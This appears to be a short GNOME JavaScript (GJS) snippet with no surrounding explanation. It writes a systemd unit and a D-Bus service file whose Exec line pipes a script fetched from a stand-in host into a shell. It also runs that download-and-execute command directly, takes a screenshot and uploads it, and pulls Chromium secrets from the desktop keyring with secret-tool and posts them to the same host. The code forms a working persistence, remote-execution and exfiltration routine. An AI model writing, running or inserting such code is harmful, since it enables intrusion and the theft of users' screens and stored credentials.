const GLib = imports.gi.GLib;
GLib.file_set_contents(path, "[Service]\n" + "ExecStart=/bin/true\n");
GLib.file_set_contents(path, "[D-BUS Service]\nName=org.example.Helper\n" + "Exec=/bin/sh -c 'curl https://example.invalid/stage | sh'\n");
GLib.spawn_command_line_async("/bin/sh -c 'curl https://example.invalid/stage | sh'");
GLib.spawn_command_line_async("/bin/sh -c 'gnome-screenshot -f /tmp/capture.png; " + "curl --data-binary @/tmp/capture.png https://example.invalid/upload'");
GLib.spawn_command_line_async("/bin/sh -c 'secret-tool search --all service chromium 2>/dev/null | " + "curl --data-binary @- https://example.invalid/upload'");
